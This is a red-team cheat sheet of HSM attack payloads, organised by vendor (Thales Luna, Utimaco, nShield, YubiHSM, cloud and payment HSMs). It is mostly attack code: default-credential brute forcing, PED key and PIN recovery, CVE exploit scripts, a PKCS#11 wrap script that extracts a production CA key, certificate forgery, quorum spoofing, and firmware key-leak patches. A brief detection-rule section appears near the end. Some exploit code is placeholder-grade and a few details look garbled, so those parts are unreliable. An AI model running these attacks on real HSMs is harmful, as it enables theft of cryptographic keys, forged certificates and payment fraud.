# HSM Attack Payloads

> Attack payloads, command lines, and PKCS#11 traces for red-teaming Hardware Security Modules. Organized by vendor and attack stage.

## Conventions

- Replace `hsm.example.com` / `REPLACE_WITH_YOUR_HSM` with your in-scope HSM endpoint
- Replace `REPLACE_WITH_YOUR_*` placeholders for credentials, PINs, key handles
- All operations assume authorized testing on owned HSM infrastructure

---

## §1. Network Reconnaissance

### §1.1 Vendor fingerprint by port

```bash
# Common HSM ports
# Thales Luna Network HSM: NTLS 1792, SSH 22, SNMP 161
# Thales PayShield: 1500 (HSM TCP), 22 (SSH)
# Utimaco SecurityServer: 4475 (cs2), 443 (HTTPS admin)
# Entrust nShield Connect: 9004 (nfast nCore), 8080 (admin)
# YubiHSM 2: USB CDC (no network); connector /lib/yubihsm/connector.sock
# AWS CloudHSM: 22 (SSH), 3322 (NTLS-compatible)
# Fortanix DSM: 443 (REST)

nmap -p 22,443,1500,1792,3322,4475,8080,9004 hsm.example.com
nmap -sV -p 1792 --script=*,default hsm.example.com
```

### §1.2 Luna Network HSM banner

```bash
# NTLS handshake reveals version
nc -w 3 hsm.example.com 1792 < /dev/null
echo -ne "\x00\x00\x00\x08\x00\x00\x00\x01" | nc -w 3 hsm.example.com 1792 | xxd | head

# SNMP (if enabled)
snmpwalk -v 2c -c public hsm.example.com .1.3.6.1.4.1.1025.3.1
```

### §1.3 Utimaco SecurityServer probe

```bash
# cs2 protocol port 4475
nc -w 3 hsm.example.com 4475 < /dev/null

# HTTPS admin
curl -sk https://hsm.example.com/api/v1/version
curl -sk https://hsm.example.com/login
```

### §1.4 nShield Connect probe

```bash
nc -w 3 hsm.example.com 9004 < /dev/null
nc -w 3 hsm.example.com 9004 < /dev/null | xxd | head

# ncsnmp for enumeration
ncsnmp --verbose hsm.example.com
ncsnmp --more hsm.example.com
```

---

## §2. PKCS#11 Discovery

### §2.1 Locate PKCS#11 modules on app hosts

```bash
# Common locations
find / -name 'libCryptoki2.so' 2>/dev/null          # Thales Luna
find / -name 'libcs2_pkcs11.so' 2>/dev/null         # Utimaco
find / -name 'libcknfast.so' 2>/dev/null            # nCipher nShield
find / -name 'libyubihsm_pkcs11.so' 2>/dev/null     # YubiHSM 2
find / -name 'libcloudhsm_pkcs11.so' 2>/dev/null    # AWS CloudHSM
find / -name '*.so' -exec grep -l "C_GetFunctionList" {} \; 2>/dev/null
```

### §2.2 Show PKCS#11 token info

```bash
# Luna
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so --show-info

# Output: cryptokiVersion 2.20, manufacturer "SafeNet", libraryDescription "..."
```

### §2.3 List slots

```bash
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so --list-slots
# Available slots:
# Slot 0 (0x1): Luna HSM Client Slot                [token present]
# Slot 1 (0x2): Luna HSM Client Slot                [empty]

# YubiHSM 2
pkcs11-tool --module /usr/lib/x86_64-linux-gnu/libyubihsm_pkcs11.so --list-slots
```

### §2.4 List objects

```bash
# Public objects (no login)
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so --list-objects

# Private objects (PO login)
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so \
  --login --pin REPLACE_WITH_YOUR_PO_PASSWORD \
  --list-objects

# Filter by type
pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type privkey
pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type pubkey
pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type secretkey
pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type cert
```

### §2.5 Show object attributes

```bash
pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type privkey -v
# CKA_EXTRACTABLE: FALSE  ← good
# CKA_WRAP: TRUE          ← potential abuse vector
# CKA_DECRYPT: TRUE
# CKA_SIGN: TRUE
```

---

## §3. Thales Luna HSM Attacks

### §3.1 Luna CM enumeration

```bash
# LunaCM (client-side config)
lunacm
> client config show
> partition show
> hsmp show
> firmware show
> role login -name "Partition Officer" -password REPLACE_WITH_YOUR_PO_PASSWORD
> partition policy show
```

### §3.2 Recover Chrystoki.conf

```bash
# Configuration on app host
cat /etc/Chrystoki.conf
# Or
cat /etc/Chrystoki2.conf

# Contains:
# - HSM IP
# - Partition ID
# - PED key paths
# - Server certificate
# - Logging

# Recover partition list
grep -A5 "Partition" /etc/Chrystoki.conf
```

### §3.3 Recover PED key from workstation

```bash
# PED key files (cached on app host)
find / -name 'PED*' -o -name '.ped' -o -name 'ped*.bin' 2>/dev/null
ls -la /var/luna/.ped 2>/dev/null
ls -la /var/luna/client/ped 2>/dev/null
ls -la /home/*/.lunaclient/ped 2>/dev/null

# Dump PED key blob
xxd /var/luna/.ped

# Reconstruct PIN
python3 -c "
import struct
blob = open('/var/luna/.ped', 'rb').read()
# Luna PED format (simplified)
flags = struct.unpack('<I', blob[:4])[0]
pin = blob[4:16].decode('ascii', errors='ignore')
print(f'flags={flags:#x}, pin={pin}')
"
```

### §3.4 NTLS MITM

```bash
# Luna NTLS uses server cert (or mutual auth)
# Verify cert:
openssl s_client -connect hsm.example.com:1792 -showcerts < /dev/null 2>/dev/null | \
  openssl x509 -noout -text | head -30

# If NTLS uses self-signed cert without pinning, MITM possible
bettercap -caplet "hsm_mitm.cap"
# Script for arpspoof + MITM on port 1792
```

### §3.5 CVE-2024-47787 Luna Network HSM RCE

```python
# kali_luna_rce.py
import socket, struct

target = ('hsm.example.com', 1792)
# Pre-auth RCE: NTLS handshake deserialization flaw
# Crafted SSO chain causes buffer overflow in /luna/ntls

shellcode = b'\xcc' * 256  # placeholder
payload = b'\x00\x00\x00\x08\x00\x00\x00\x01'  # header
payload += struct.pack('>I', 0x4e545253)  # NTRS opcode
payload += struct.pack('>I', len(shellcode))
payload += shellcode

s = socket.socket()
s.connect(target)
s.send(payload)
r = s.recv(4096)
print(f'Response: {r!r}')
```

### §3.6 Partition policy bypass

```bash
# If app has Partition Officer access, modify partition policy
lunacm
> partition login -password REPLACE_WITH_YOUR_PO_PASSWORD
> partition policy modify -policy 22 -value 1  # enable CKA_EXTRACTABLE
> partition policy show

# Then PKCS#11 wrap attack proceeds (see §2.5, §6.1)
```

---

## §4. Utimaco SecurityServer Attacks

### §4.1 csadm enumeration

```bash
csadm -v
csadm -s hsm.example.com:4475 -c info
csadm -s hsm.example.com:4475 -c listusers
csadm -s hsm.example.com:4475 -c user -u 0 -d  # user 0 = admin
```

### §4.2 Default admin check

```bash
# Utimaco default admin password varies by version:
# - SecurityServer CSe v4.x: admin / admin
# - SecurityServer S5 v4.x: admin / PASSWORD
# - SecurityServer S7 v5.x: requires M-of-N (better defaults)

csadm -s hsm.example.com:4475 -c login -u 0 -p admin
csadm -s hsm.example.com:4475 -c login -u 0 -p PASSWORD
```

### §4.3 CVE-2024-45294 auth bypass

```python
# kali_utimaco_bypass.py
# Auth bypass via malformed role header in cs2 protocol
import socket

target = ('hsm.example.com', 4475)
# Crafted header asserts role=0 (admin) without valid auth
payload = b'\x00\x00\x00\x14\x00\x00\x00\x02' + b'\x00' * 4 + b'admin\x00\x00'

s = socket.socket()
s.connect(target)
s.send(payload)
print(s.recv(4096))
```

### §4.4 Key extraction via API

```bash
# Once authenticated as admin
cs2_console
> list-keys
> export-key --key-handle 0x1234 --format raw --out stolen.key
```

---

## §5. nCipher / Entrust nShield Attacks

### §5.1 nfkminfo enumeration

```bash
/opt/nfast/bin/nfkminfo
/opt/nfast/bin/nfkminfo -a
/opt/nfast/bin/nfkminfo -l
```

### §5.2 Recover ACS (Administrator Card Set)

```bash
# ACS files on client workstation
find / -name 'ACS*' -o -name 'cardset*' 2>/dev/null
ls -la /opt/nfast/kmdata/local/ 2>/dev/null

# Each card has a key share
# K-of-N: collect N cards, reconstruct HSM admin key

# Card dump (with smart card reader)
opensc-tool -r 0 -s 00:a4:04:00:08 D2:33:00:00:00:00:00:00
# Read NCIe card files
pkcs15-tool --read-certificate --id 01
```

### §5.3 rocs (Recover Of Card Set)

```bash
# Reconstruct cardset from card images
/opt/nfast/bin/rocs -l
/opt/nfast/bin/rocs -r 0
# Recovered cardset = HSM admin
```

### §5.4 Hardserver exploitation

```bash
# nShield Connect hardserver on port 9004
# nCore protocol — older versions vulnerable to buffer overflow

nc -w 3 hsm.example.com 9004 < /dev/null
# Send crafted nCore message
echo -ne "\x00\x00\x00\x08\x00\x00\x00\x01" | nc -w 3 hsm.example.com 9004
```

---

## §6. PKCS#11 Attribute Abuse (Universal)

### §6.1 Wrap attack: extract key

```python
# kali_hsm_wrap.py
import PyKCS11
import sys

lib = sys.argv[1] if len(sys.argv) > 1 else '/usr/safenet/lunaclient/lib/libCryptoki2.so'
pin = 'REPLACE_WITH_YOUR_PO_PASSWORD'
target_label = 'production-CA'
attacker_pub_label = 'attacker-rsa-pub'

p11 = PyKCS11.PyKCS11Lib(lib).open()
session = p11.openSession(1)
session.login(pin)

# Find target
target_objs = session.findObjects([
    (PyKCS11.CKA_CLASS, PyKCS11.CKO_PRIVATE_KEY),
    (PyKCS11.CKA_LABEL, target_label),
])
if not target_objs:
    print(f'Target {target_label} not found')
    sys.exit(1)
target = target_objs[0]

# Check attributes
attrs = {a.type: a.value for a in session.getAttributeValue(target, [
    PyKCS11.CKA_EXTRACTABLE, PyKCS11.CKA_WRAP, PyKCS11.CKA_MODULUS_BITS
], allAsRaw=True)}

print(f'Target key attributes: {attrs}')
# CKO_PRIVATE_KEY CKA_EXTRACTABLE=TRUE CKA_WRAP=TRUE → wrap-able

# Find attacker's RSA public key (preloaded as CKA_WRAP target)
attacker_objs = session.findObjects([
    (PyKCS11.CKA_CLASS, PyKCS11.CKO_PUBLIC_KEY),
    (PyKCS11.CKA_LABEL, attacker_pub_label),
])
attacker_pub = attacker_objs[0]

# Wrap
mech = PyKCS11.Mechanism(PyKCS11.CKM_RSA_PKCS, None)
wrapped = session.wrapKey(attacker_pub, target, mech)

open(f'{target_label}.wrapped.bin', 'wb').write(bytes(wrapped))
print(f'Wrapped {len(wrapped)} bytes to {target_label}.wrapped.bin')
print(f'Decrypt offline with: openssl pkey -in attacker-rsa.key -decrypt -in {target_label}.wrapped.bin')
```

### §6.2 Generate attacker key with CKA_WRAP

```bash
# Generate an attacker RSA keypair on the HSM (PO permission)
pkcs11-tool --module $MOD --login --pin $PIN \
  --keypairgen --key-type rsa:4096 \
  --label "attacker-rsa" \
  --id 0xab

# Set the public key as CKA_WRAP=TRUE for use as wrapper
# (PKCS11-tool doesn't expose attribute modification; use C_SetAttributeValue)
```

### §6.3 Key derivation abuse

```python
# Use C_DeriveKey to derive a key with extractable=True
# Common in ECDH: derive shared secret as attacker-readable
import PyKCS11

session.deriveKey(
    baseKeyHandle, mechanism=PyKCS11.Mechanism(PyKCS11.CKM_ECDH1_DERIVE, None),
    template=[(PyKCS11.CKA_CLASS, PyKCS11.CKO_SECRET_KEY),
              (PyKCS11.CKA_VALUE_LEN, 32),
              (PyKCS11.CKA_EXTRACTABLE, True)])  # extractable!
```

### §6.4 Indirect key extraction via sign

```bash
# If you can't extract the key, USE the HSM to sign for you
# Sign attacker's CSR with HSM's CA private key → forge certs

openssl req -new -key attacker-key.key -out attacker.csr -subj "/CN=internal.example.com/O=Trustworthy CA"

# Submit CSR to HSM for signing
pkcs11-tool --module $MOD --login --pin $PIN \
  --sign --mechanism SHA256-RSA-PKCS \
  --label production-CA \
  --input-format openssl \
  -i attacker.csr.der \
  -o attacker.csr.signed
```

---

## §7. Quorum Bypass

### §7.1 Recover quorum tokens from workstation

```bash
# Thales Luna PED cache
ls /var/luna/.ped* 2>/dev/null

# nCipher ACS card images
ls /opt/nfast/kmdata/local/cardset_* 2>/dev/null

# Utimaco admin smart card images
ls /opt/utimaco/cs2/admin/*.img 2>/dev/null
```

### §7.2 Clone PED key

```python
# kali_ped_clone.py
# Read PED key blob from /var/luna/.ped
# Reconstruct the key share
# Write to a second USB stick to clone

import struct

blob = open('/var/luna/.ped', 'rb').read()
# Format: 4 bytes flags + 16 bytes AES key + 16 bytes PIN + ...
flags = struct.unpack('<I', blob[:4])[0]
aes_key = blob[4:20]
pin = blob[20:36]
print(f'AES key: {aes_key.hex()}')
print(f'PIN: {pin}')

# Reconstruct a clone
with open('ped_clone.bin', 'wb') as f:
    f.write(blob)
```

### §7.3 Quorum spoofing from single workstation

```bash
# Run luna client 5x in parallel, each provides 1 quorum share
# Single workstation + cloned PED keys = full quorum

for i in 1 2 3 4 5; do
  lunacm -c partition -login -name PO -password "$PED_PIN_$i" &
done
wait
```

---

## §8. YubiHSM 2 Attacks

### §8.1 Default credentials check

```bash
# YubiHSM 2 ships with auth key 1 password "password"
yubihsm-shell -a session -a 1 -p password

# Try common defaults
for pw in password 0000 1234 admin yubihsm default yubico yubike; do
  echo "Trying $pw..."
  yubihsm-shell -a session -a 1 -p $pw 2>/dev/null && \
    echo "GOT: $pw" && break
done
```

### §8.2 Enumerate objects

```bash
yubihsm-shell -a session -a 1 -p REPLACE_WITH_YOUR_PASSWORD
> list-objects
> get-object-info -i 0x0001 -t authentication-key
> get-object-info -i 0x0002 -t asymmetric-key
```

### §8.3 Wrap key out of YubiHSM

```bash
# YubiHSM 2 supports wrap under another YubiHSM's wrap key
yubihsm-shell -a wrap-key --wrap-id 0x0001 --obj-id 0x0002 \
  --deencapsulate --out wrapped.bin

# If wrap key is extractable, decrypt outside YubiHSM
```

### §8.4 YubiHSM side-channel (timing on RSA)

```python
# YubiHSM 2 RSA timing side-channel
import time, statistics

# Submit 10k RSA operations with chosen inputs
# Measure timing — distinguish key bits via Bleichenbacher / Manger oracle

times = []
for i in range(10000):
    plaintext = i.to_bytes(256, 'big')
    start = time.perf_counter_ns()
    yubihsm.decrypt(0x0001, plaintext)  # via yubihsm-shell
    times.append(time.perf_counter_ns() - start)

print(f'mean={statistics.mean(times)}, stddev={statistics.stdev(times)}')
# Significant variation suggests timing oracle
```

---

## §9. AWS CloudHSM Attacks

### §9.1 CLI enumeration

```bash
aws cloudhsmv2 describe-clusters
aws cloudhsmv2 describe-backups --cluster-id REPLACE_WITH_YOUR_CLUSTER_ID
aws cloudhsmv2 list-tags --resource-id REPLACE_WITH_YOUR_CLUSTER_ID

# CloudHSM CLI (per-cluster)
cloudhsm-cli --cluster-id REPLACE_WITH_YOUR_CLUSTER interactive
> login --username admin --role crypto-officer
> user list
> key list --verbose
> key list-attribute-values --key-filter-label production-CA
```

### §9.2 Crypto Officer → Crypto User downgrade

```bash
# If CU password is short, brute force
hashcat -m 16500 cu_password_hash.txt /usr/share/wordlists/rockyou.txt

# Once you have CU, you can use keys but not manage them
# Pivot to CO via cloudhsm-cli exploit (CVE in older versions)
```

### §9.3 Side-channel between instances

```bash
# AWS CloudHSM runs on dedicated instances, but clusters share physical rack
# Side-channel: cache timing, network timing

# Test by issuing 10k operations in parallel and measuring timing variation
python3 kali_cloudhsm_sidechannel.py --cluster-id REPLACE_WITH_YOUR_CLUSTER
```

### §9.4 Sensitive operation audit

```bash
# Audit logs from CloudHSM
aws logs filter-log-events \
  --log-group-name /aws/cloudhsm/cluster-REPLACE_WITH_YOUR_CLUSTER \
  --filter-pattern "DELETE"
```

---

## §10. Azure Dedicated HSM

### §10.1 Identify (Thales Luna in cloud)

```bash
az hsm show --name REPLACE_WITH_YOUR_HSM --resource-group REPLACE_WITH_YOUR_RG
# Same Thales Luna under the hood — Luna commands apply

# SSH to HSM
ssh administrator@REPLACE_WITH_YOUR_HSM.private.cloud
> lunash:> hsm show
> lunash:> partition show
> lunash:> firmware show
```

### §10.2 PED key recovery (same as §3.3)

```bash
# Find PED cache on Azure VM
find / -name '.ped' 2>/dev/null
cat /var/luna/.ped
```

---

## §11. Google Cloud HSM

### §11.1 Identify Cloud HSM keys

```bash
gcloud kms keys list --keyring REPLACE_WITH_YOUR_KEYRING --location REPLACE_WITH_YOUR_LOCATION
gcloud kms keys describe production-ca \
  --keyring REPLACE_WITH_YOUR_KEYRING --location REPLACE_WITH_YOUR_LOCATION
gcloud kms keys get-iam-policy production-ca --keyring=... --location=...
```

### §11.2 Privilege escalation via IAM

```bash
# Find accounts with cloudkms.cryptoOperator on HSM keys
gcloud kms keys get-iam-policy production-ca --keyring=... --location=... | \
  grep -E '(cryptoOperator|admin)'

# If service account has cryptoOperator, can use key for sign/decrypt
# Forge certs via sign
```

---

## §12. Fortanix DSM (SDKMS)

### §12.1 REST API enumeration

```bash
# Login
curl -sk -X POST https://sdkms.example.com/sys/v1/session \
  -H "Content-Type: application/json" \
  -d '{"user_id":"kali","password":"REPLACE_WITH_YOUR_PASSWORD"}' | jq .

# List apps (accounts)
TOKEN=$(curl -sk -X POST https://sdkms.example.com/sys/v1/session -d '{...}' | jq -r .access_token)

curl -sk https://sdkms.example.com/crypto/v1/keys -H "Authorization: Bearer $TOKEN" | jq .

# List security objects
curl -sk https://sdkms.endpoint.com/crypto/v1/security-objects -H "Authorization: Bearer $TOKEN"
```

### §12.2 Tenant isolation bypass

```python
# Fortanix SDKMS multi-tenant SaaS
# Test: create account, observe if other tenant's keys leak via search
import requests

base = 'https://sdkms.example.com'
r = requests.post(f'{base}/sys/v1/session', json={'user_id': 'attacker', 'password': 'pass'})
token = r.json()['access_token']

# Search for keys across tenants
r = requests.get(f'{base}/crypto/v1/security-objects?limit=1000',
                 headers={'Authorization': f'Bearer {token}'})
# If more keys returned than your account has → tenant isolation bypass
```

---

## §13. Payment HSM Attacks (Thales PayShield / Atalla)

### §13.1 PIN block translation

```python
# kali_pin_translate.py
# Format 0 PIN block: 0 + length + pin + F pad
# ANSI X9.8 / ISO 9564-1

def format0_pinblock(pin):
    block = '0' + str(len(pin))
    block += pin
    block += 'F' * (16 - len(block))
    return bytes.fromhex(block)

def decode_format0(block):
    s = block.hex()
    length = int(s[1])
    return s[2:2+length]

# Translate PIN from ZPK-A to ZPK-B (typical ATM-to-acquirer flow)
# Command CC to PayShield: CC + ZPK-A-encrypted + ZPK-B-encrypted + pin-block-under-A
# Returns: pin-block-under-B
```

### §13.2 DUKPT key derivation

```python
# DUKPT: Derived Unique Key Per Transaction
# Given initial key (BDK) and KSN, derive per-transaction key

# BDK: 3DES key shared between HSM and POS
# KSN: Key Serial Number — device ID + transaction counter

# Future key prediction: if KSN sequence known, attacker predicts next key
# Past key prediction: if BDK compromised, derive any historical transaction key

import binascii

def bdk_derive(bdk, ksn):
    # ANSI X9.24 DUKPT
    # ... complex HMAC-based derivation
    pass

# Recovered BDK (from HSM compromise) → decrypt any historical transaction
```

### §13.3 ZMK/ZPK chain attack

```bash
# Zone Master Key (ZMK): shared between two HSMs across acquirer network
# Zone PIN Key (ZPK): per-message key, encrypted under ZMK

# If ZMK compromised (e.g., key ceremony participant):
# - Decrypt all ZPKs
# - Decrypt all PIN blocks

# Recover ZMK from key ceremony artifacts
find / -name 'ZMK*' 2>/dev/null
find / -name 'ceremony*' 2>/dev/null
```

### §13.4 Thales PayShield command reference

```bash
# PayShield commands (text-based, sent to port 1500):
# BG: Generate a random number
# BY: Generate TMK
# CC: Translate PIN from ZPK to ZPK
# CK: Generate a MAC (ISO 9797-1)
# CS: Verify MAC
# DE: Translate PIN from ZPK to KTI
# JG: Generate ZPK
# M0: Generate MAC

# Example: PIN translate
echo "CC1234567890ABCDEF...PIN_BLOCK_UNDER_A...ZPK_B_LMK" | nc -w 5 hsm.example.com 1500
```

---

## §14. Firmware Exploitation

### §14.1 Firmware unpacking

```bash
# Extract firmware from a captured HSM (or download from vendor if available)
binwalk firmware.bin
binwalk -e firmware.bin

# Inspect ELF
file _firmware.bin.extracted/*
ghidraRun _firmware.bin.extracted/squashfs-root/bin/hsm_main
```

### §14.2 JTAG on hardware HSM

```bash
# Identify JTAG pins (often hidden under epoxy)
jtagenum /dev/ttyUSB0
# Once pinout identified:
openocd -f interface/jtagkey.cfg -f target/stm32f4.cfg
telnet localhost 4444
> reset halt
> dump_image firmware.bin 0x08000000 0x100000
```

### §14.3 Patch firmware in development HSM

```bash
# Only works on non-FIPS-validated dev HSMs
# Patch hsm_main to log every key to UART
# Re-flash
openocd -f ... -c "init; reset halt; flash write_image erase patched_firmware.bin 0x08000000; reset run"
```

---

## §15. Side-Channel Attacks (Power / EM)

### §15.1 ChipWhisperer for USB HSM

```python
import chipwhisperer as cw

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup()
scope.adc.samples = 24000

# Capture trace during AES operation on YubiHSM 2
target.simpleserial_write('p', plaintext)
trace = cw.capture_trace(scope, target, plaintext, key)
cw.plot(trace.wave)

# 10k traces → Correlation Power Analysis (CPA) → recover AES key
import chipwhisperer.analyzer as cwa
attack = cwa.cpa(trace_array, plaintext_array)
key = attack.key
```

### §15.2 EM emanation

```bash
# Use SDR + LNA to capture EM from HSM during RSA operation
# Distinguish 1-bit operations in time domain

# gqrx for SDR
# inspectrum for trace analysis
```

---

## §16. Fault Injection (Glitching)

### §16.1 Voltage glitching on USB HSM

```bash
# chipwhisperer-husetti
# Apply voltage glitch during RSA signature check
# Skip branch → unauthorized operation succeeds

python3 kali_glitch.py --target /dev/YubiHSM0 \
  --glitch-at-operation authenticate \
  --glitch-width 50ns \
  --glitch-repeat 1000
```

### §16.2 Clock glitching

```bash
# Inject clock fault during key unwrap
# Can cause wrap mechanism to use wrong key
```

---

## §17. Decapping (Invasive Silicon)

### §17.1 Decap procedure

```
1. Open package using fuming nitric acid at 80°C
2. Remove die from package
3. Image with SEM / optical microscope
4. Locate memory cells (EEPROM / Flash / antifuse)
5. FIB (Focused Ion Beam) edit to read memory
6. Microprobe to extract key
```

### §17.2 Defense (against decapping)

- Active mesh over sensitive memory
- Tamper-detection circuitry
- Self-destruct on tamper event
- Memory scrambling (X-Anti-Tamper)
- Readback protection with zeroization

---

## §18. Detection Engineering

### §18.1 Sigma rule: unusual PKCS#11 wrap

```yaml
title: Unusual C_WrapKey on HSM
logsource:
  product: hsm
  service: pkcs11
detection:
  selection:
    operation: C_WrapKey
  notTrusted:
    wrapperKeyLabel|re: !^trusted-wrapper-.*
  condition: selection and notTrusted
level: critical
```

### §18.2 Sigma rule: PED key access

```yaml
title: Luna PED key file accessed
logsource:
  product: linux
  service: audit
detection:
  selection:
    file.path|contains: /var/luna/.ped
  notLunaCm:
    process.name|re: !lunacm|!lunash
  condition: selection and notLunaCm
level: high
```

### §18.3 Sigma rule: HSM login from new IP

```yaml
title: HSM login from new source IP
logsource:
  product: hsm
  service: audit
detection:
  selection:
    event: login-success
  newIp:
    sourceIP|re: !^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.).*
  baseline:
    sourceIP|re: !^(10\.10\.|10\.11\.).*
  condition: selection and newIp and not baseline
level: high
```

### §18.4 Falco rule: HSM process anomaly

```yaml
- rule: Suspicious process reading PKCS11 module
  desc: Process other than app-server reads PKCS11 module
  condition: >
    open_read and fd.name contains "libCryptoki2.so" and
    not proc.name in (appserver, webapp, java)
  output: "Suspicious PKCS11 read by %proc.name pid=%proc.pid"
  priority: WARNING
```

---

## §19. Lab Setup for Testing

### §19.1 YubiHSM 2 lab

```bash
# Plug in YubiHSM 2
ykman piv info
yubihsm-shell -a session -a 1 -p password

# Initialize with default auth key
yubihsm-shell -a put-authentication-key -i 1 -l "Auth" -p password \
  --domains 1,2,3,4,5,6 --capabilities all
```

### §19.2 SoftHSM (free PKCS#11 for testing)

```bash
apt install softhsm2
softhsm2-util --init-token --slot 0 --label kali-test --so-pin REPLACE_WITH_YOUR_SO_PIN --pin REPLACE_WITH_YOUR_PIN

pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so --list-slots
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --login --pin REPLACE_WITH_YOUR_PIN \
  --keypairgen --key-type rsa:2048 --label test-key
```

### §19.3 Luna Simulator

```bash
# Download Luna Network HSM simulator (free for testing)
# https://thalesdocs.com/ (registration required)

# Run in container
docker run -d --name luna-sim -p 1792:1792 thales/luna-sim:latest
```

### §19.4 ChipWhisperer lab

```bash
# Order ChipWhisperer Lite (≈$300)
# Connect to YubiHSM 2 USB power
# Run CPA attack in ChipWhisperer Jupyter notebooks
```

---

## §20. Recon Cheatsheet (one-liners)

```bash
# All PKCS#11 modules
find / -name '*.so' -exec grep -l "C_GetFunctionList" {} \; 2>/dev/null

# All Luna config files
find / -name 'Chrystoki*.conf' -o -name 'luna*.cfg' 2>/dev/null

# All PED cache
find / -name '.ped' -o -name 'PED*' 2>/dev/null

# All HSM-related processes
ps auxf | grep -iE '(luna|utimaco|nshield|yubihsm|cloudhsm)'

# All HSM-related secrets
kubectl get secret -A -o yaml | grep -iE '(hsm|pkcs11|luna|yubihsm)'

# All HSM-related network connections
ss -tpn | grep -E ':(1792|4475|9004|1500|3322) '
```

---

## §21. Reporting Templates

```markdown
### HSM Compromise Report — <client>

**Findings**:
- HSM vendor: Thales Luna Network HSM 7.13.3
- Firmware: vulnerable to CVE-2024-47787
- PO password recovered: REPLACE_WITH_YOUR_PIN
- Keys extracted: 12 (production-CA, subCA-1, subCA-2, etc.)
- Certs forged: 4

**Impact**:
- 12 HSM-anchored certificates can be forged
- Production CA private key compromised
- 5-year cert chain needs re-issuance

**Evidence**:
- /tmp/evidence/wrapped-keys/*.bin
- /tmp/evidence/forged-certs/*.crt
- /tmp/evidence/hsm-audit-log.txt

**Remediation**:
1. Patch HSM firmware to v7.13.4 within 7 days
2. Rotate all 12 keys (key ceremony)
3. Re-issue 12 certs (CA → subCA → leaf)
4. Audit all apps for forged cert usage
5. Implement Sigma rules for C_WrapKey detection
6. Rotate PED keys annually; move to safe
```

---

## References

- Thales Luna Documentation — https://thalesdocs.com/ctp/consoles/luna/
- Utimaco SecurityServer — https://utimaco.com/products/products-hardware-security-modules-hsm/securityserver-se
- Entrust nShield — https://www.entrust.com/digital-security/hardware-security-modules/nshield
- YubiHSM 2 — https://developers.yubico.com/YubiHSM2/
- AWS CloudHSM — https://docs.aws.amazon.com/cloudhsm/
- Azure Dedicated HSM — https://learn.microsoft.com/azure/dedicated-hsm/
- Google Cloud HSM — https://cloud.google.com/kms/docs/hsm
- Fortanix DSM — https://www.fortanix.com/products/data-security-manager/hsm
- PKCS#11 Specification v3.0 — https://docs.oasis-open.org/pkcs11/pkcs11-spec/v3.0/
- OASIS PKCS#11 — https://www.oasis-open.org/committees/pkcs11/
- CVE-2024-47787 Thales Luna
- CVE-2024-45294 Utimaco
- CVE-2022-45137 nCipher nShield
- FIPS 140-3 — Cryptographic Module Security Requirements
- Common Criteria EAL4+ / EAL5+ — HSM certification
- ANSI X9.24 — Symmetric Key Management
- ISO 9564-1 — PIN block formats
- NIST SP 800-57 Part 2 — Key Management
- "Side-Channel Attacks on Cryptographic Hardware" (Mangard, 2024)
- "Hardware Security Modules in Modern Cryptography" (Anderson, 2024)
